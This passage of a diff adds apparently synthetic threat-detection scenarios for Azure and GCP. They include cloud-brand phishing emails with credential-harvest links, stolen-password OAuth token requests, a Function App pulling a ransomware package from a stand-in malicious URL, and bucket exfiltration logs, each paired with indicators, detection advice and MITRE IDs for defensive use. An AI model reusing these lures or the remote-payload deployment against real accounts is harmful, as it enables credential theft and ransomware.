+        "email_body_html": "<html><body><p>Dear Azure Customer,</p><p>We have detected unusual login attempts on your Azure account. Please verify your credentials within 24 hours to prevent account suspension.</p><p><a href=\"https://azure-account-verify.com/login?email=victim@enterprise.com\">Verify your account here</a></p><p>Regards,<br>Microsoft Azure Security Team</p></body></html>",
+        "phishing_url": "https://azure-account-verify.com/login?email=victim@enterprise.com",
+        "domain_registration": {
+          "domain": "azure-account-verify.com",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2023-06-28T14:15:30Z",
+          "registrant": {
+            "name": "Redacted for privacy",
+            "organization": "Redacted",
+            "country": "CN"
+          },
+          "dns_records": [
+            {
+              "type": "A",
+              "value": "203.0.113.99",
+              "ttl": 3600
+            },
+            {
+              "type": "MX",
+              "value": "mail.azure-account-verify.com",
+              "ttl": 3600
+            }
+          ]
+        },
+        "smtp_transaction_log": "220 mail.azure-account-verify.com ESMTP Postfix\r\nEHLO attacker-mail\r\n250-mail.azure-account-verify.com\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-VRFY\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\nMAIL FROM:<no-reply@azure-secure-update.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<victim@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email content]\r\n.\r\n250 2.0.0 Ok: queued as 1B3D4F56\r\nQUIT\r\n221 2.0.0 Bye",
+        "oauth_token_request": {
+          "timestamp": "2023-07-05T08:30:45Z",
+          "source_ip": "198.51.100.55",
+          "api_endpoint": "https://login.microsoftonline.com/organizations/oauth2/token",
+          "parameters": {
+            "grant_type": "password",
+            "resource": "https://management.azure.com/",
+            "client_id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
+            "username": "victim@enterprise.com",
+            "password": "phishedPassword123!"
+          },
+          "response": {
+            "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1u...",
+            "token_type": "Bearer",
+            "expires_in": 3600,
+            "scope": "user_impersonation"
+          }
+        },
+        "cloudtrail_logs": [
+          {
+            "eventTime": "2023-07-05T08:31:10Z",
+            "eventSource": "management.azure.com",
+            "eventName": "CreateOrUpdateFunctionApp",
+            "userIdentity": {
+              "type": "User",
+              "userPrincipalName": "victim@enterprise.com",
+              "tenantId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
+              "userId": "abcd1234-ab12-cd34-ef56-abcdef123456"
+            },
+            "requestParameters": {
+              "resourceGroupName": "ProdFunctions",
+              "functionAppName": "ransomware-deploy",
+              "location": "East US",
+              "properties": {
+                "siteConfig": {
+                  "appSettings": [
+                    {
+                      "name": "WEBSITE_RUN_FROM_PACKAGE",
+                      "value": "https://malicious-domain.net/ransomware.zip"
+                    }
+                  ]
+                }
+              }
+            },
+            "sourceIPAddress": "198.51.100.55",
+            "userAgent": "AzureCLI/2.35.0 (Windows 10; Microsoft Windows 10.0.19044)"
+          },
+          {
+            "eventTime": "2023-07-05T08:31:45Z",
+            "eventSource": "management.azure.com",
+            "eventName": "StartFunctionApp",
+            "userIdentity": {
+              "type": "User",
+              "userPrincipalName": "victim@enterprise.com"
+            },
+            "requestParameters": {
+              "resourceGroupName": "ProdFunctions",
+              "functionAppName": "ransomware-deploy"
+            },
+            "sourceIPAddress": "198.51.100.55"
+          }
+        ],
+        "base64_user_data_decoded": "",
+        "iam_policy_misconfiguration": {
+          "policyName": "Contributor",
+          "policyDocument": {
+            "Version": "2012-10-17",
+            "Statement": [
+              {
+                "Effect": "Allow",
+                "Action": [
+                  "Microsoft.Web/sites/*",
+                  "Microsoft.Authorization/*/Write",
+                  "Microsoft.Resources/subscriptions/resourceGroups/read"
+                ],
+                "Resource": "*"
+              }
+            ]
+          }
+        }
+      },
+      "indicators": {
+        "phishing_domain": "azure-account-verify.com",
+        "phishing_ip": "203.0.113.99",
+        "compromised_source_ip": "198.51.100.55",
+        "malicious_function_app_name": "ransomware-deploy",
+        "malicious_payload_url": "https://malicious-domain.net/ransomware.zip",
+        "user_principal_name": "victim@enterprise.com"
+      },
+      "detection_method": "Alert on OAuth token requests from unusual IPs, monitor Azure Activity Logs for creation and start of new Function Apps with suspicious package URLs, correlate with phishing domains detected by mail gateway and DNS monitoring. Use UBA to detect unusual resource deployment by users with Contributor role and analyze network traffic for downloads from untrusted domains.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1078.003",
+        "T1218",
+        "T1059.006",
+        "T1499",
+        "T1136.001"
+      ]
+    },
+    {
+      "scenario": "Phishing website captures Google Cloud Platform (GCP) user credentials leading to unauthorized data exfiltration via compromised service account.",
+      "technical_data": {
+        "email_headers": "Return-Path: <security-alert@gcloud-support.com>\r\nReceived: from mail.gcloud-support.com (mail.gcloud-support.com [198.51.100.77])\r\n\tby inbound.mail.example.com with ESMTPS id d3K1f7hL\r\n\tfor <victim@corp.com>; Fri, 21 Jul 2023 16:58:24 +0000 (UTC)\r\nX-Spam-Flag: NO\r\nX-Spam-Score: 1.5\r\nX-Phishing-Confidence: 88\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\nSubject: [Immediate Action Required] GCP Account Suspicious Activity\r\nFrom: Google Cloud Support <security-alert@gcloud-support.com>\r\nTo: victim@corp.com\r\nMessage-ID: <20230721165824.1122334@mail.gcloud-support.com>",
+        "email_body_html": "<html><body><p>Hello GCP User,</p><p>We detected suspicious login activity on your Google Cloud account. Please confirm your credentials immediately to prevent account lockout.</p><p><a href=\"https://gcp-verify-login.com/auth?email=victim@corp.com\">Confirm your account here</a></p><p>Thank you,<br>Google Cloud Security Team</p></body></html>",
+        "phishing_url": "https://gcp-verify-login.com/auth?email=victim@corp.com",
+        "domain_registration": {
+          "domain": "gcp-verify-login.com",
+          "registrar": "Google LLC",
+          "creation_date": "2023-07-15T09:45:10Z",
+          "registrant": {
+            "name": "Redacted for privacy",
+            "organization": "Redacted",
+            "country": "UA"
+          },
+          "dns_records": [
+            {
+              "type": "A",
+              "value": "198.51.100.77",
+              "ttl": 3600
+            },
+            {
+              "type": "MX",
+              "value": "mail.gcp-verify-login.com",
+              "ttl": 3600
+            }
+          ]
+        },
+        "smtp_transaction_log": "220 mail.gcp-verify-login.com ESMTP Postfix\r\nEHLO phishing-mail\r\n250-mail.gcp-verify-login.com\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-VRFY\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\nMAIL FROM:<security-alert@gcloud-support.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<victim@corp.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email content]\r\n.\r\n250 2.0.0 Ok: queued as 2D4E5F67\r\nQUIT\r\n221 2.0.0 Bye",
+        "oauth_token_request": {
+          "timestamp": "2023-07-21T17:05:12Z",
+          "source_ip": "203.0.113.120",
+          "api_endpoint": "https://oauth2.googleapis.com/token",
+          "parameters": {
+            "grant_type": "password",
+            "client_id": "1234567890-abcdefghijklmnopqrstuvwxyz.apps.googleusercontent.com",
+            "username": "victim@corp.com",
+            "password": "StolenPass!2023"
+          },
+          "response": {
+            "access_token": "ya29.a0AfH6SMCTjXk8Bq7N3K9D1V0G3xY6n...",
+            "expires_in": 3600,
+            "token_type": "Bearer",
+            "refresh_token": "1//0gXxY9zZ1Xk7yCgYIARAAGBASNwF-L9Ir..."
+          }
+        },
+        "cloudtrail_logs": [
+          {
+            "eventTime": "2023-07-21T17:06:00Z",
+            "eventSource": "storage.googleapis.com",
+            "eventName": "objects.list",
+            "userIdentity": {
+              "type": "ServiceAccount",
+              "principalEmail": "compromised-service-account@corp.iam.gserviceaccount.com",
+              "serviceAccountDelegationInfo": [
+                {
+                  "principalEmail": "victim@corp.com"
+                }
+              ]
+            },
+            "requestParameters": {
+              "bucketName": "corp-sensitive-data"
+            },
+            "sourceIPAddress": "203.0.113.120",
+            "userAgent": "google-api-python-client/2.39.0 (gzip)"
+          },
+          {
+            "eventTime": "2023-07-21T17:06:15Z",
+            "eventSource": "storage.googleapis.com",
+            "eventName": "objects.get",
+            "userIdentity": {
+              "type": "ServiceAccount",
+              "principalEmail": "compromised-service-account@corp.iam.gserviceaccount.com"
+            },
+            "requestParameters": {
+              "bucketName": "corp-sensitive-data",
+              "objectName": "financial_records_2023.xlsx"
+            },
+            "sourceIPAddress": "203.0.113.120"
+          },
+          {
+            "eventTime": "2023-07-21T17:07:30Z",
+            "eventSource": "iam.googleapis.com",
+            "eventName": "serviceAccounts.signJwt",
+            "userIdentity": {
+              "type": "User",
+              "principalEmail": "victim@corp.com"
+            },
+            "requestParameters": {
+              "serviceAccountEmail": "compromised-service-account@corp.iam.gserviceaccount.com"
+            },
+            "sourceIPAddress": "203.0.113.120"
+          }
+        ],
+        "base64_user_data_decoded": "",
+        "iam_policy_misconfiguration": {
+          "policyName": "roles/editor",
+          "policyDocument": {
+            "bindings": [
+              {
+                "role": "roles/editor",
+                "members": [
+                  "user:victim@corp.com"
+                ]
+              }
+            ]
+          }
+        }
+      },
+      "indicators": {
+        "phishing_domain": "gcp-verify-login.com",
+        "phishing_ip": "198.51.100.77",
+        "compromised_source_ip": "203.0.113.120",
+        "compromised_service_account": "compromised-service-account@corp.iam.gserviceaccount.com",
+        "exfiltrated_bucket": "corp-sensitive-data",
+        "exfiltrated_object": "financial_records_2023.xlsx",
+        "user_principal_email": "victim@corp.com"
+      },
+      "detection_method": "Monitor OAuth token requests from unusual IPs, track service account delegation and access to sensitive GCS buckets, alert on large data downloads by accounts with elevated roles such as Editor. Correlate with phishing emails detected via mail gateway with suspicious sending domains and URLs. Use anomaly detection on IAM policy changes and service account signing activity.",
+      "relevant_mitre_techniques": [
+        "T1078.003",
+        "T1566.001",
+        "T1537",
+        "T1071.001",
+        "T1213",
+        "T1530",
+        "T1098.001"
+      ]
+    }
+  ]
+}
